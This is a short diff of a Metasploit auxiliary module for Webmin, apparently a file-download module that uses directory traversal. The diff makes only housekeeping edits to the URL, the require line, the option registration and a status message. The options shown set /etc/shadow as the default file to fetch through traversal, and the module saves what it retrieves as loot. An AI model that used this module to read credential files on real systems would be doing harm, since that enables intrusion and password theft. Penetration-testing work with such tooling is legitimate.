@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -49,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD',  [true, 'Webmin Password']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 4]),
         OptString.new('RPATH', [ true, "The file to download", "/etc/shadow" ])
-      ], self.class)
+      ])
   end
 
   def run
@@ -98,12 +94,11 @@ class MetasploitModule < Msf::Auxiliary
       loot = $1
       f = ::File.basename(datastore['RPATH'])
       path = store_loot('webmin.file', 'application/octet-stream', rhost, loot, f, datastore['RPATH'])
-      print_status("#{datastore['RPATH']} saved in #{path}")
+      print_good("#{datastore['RPATH']} saved in #{path}")
     else
       print_error("Failed to retrieve the file")
       return
     end
 
   end
-
 end
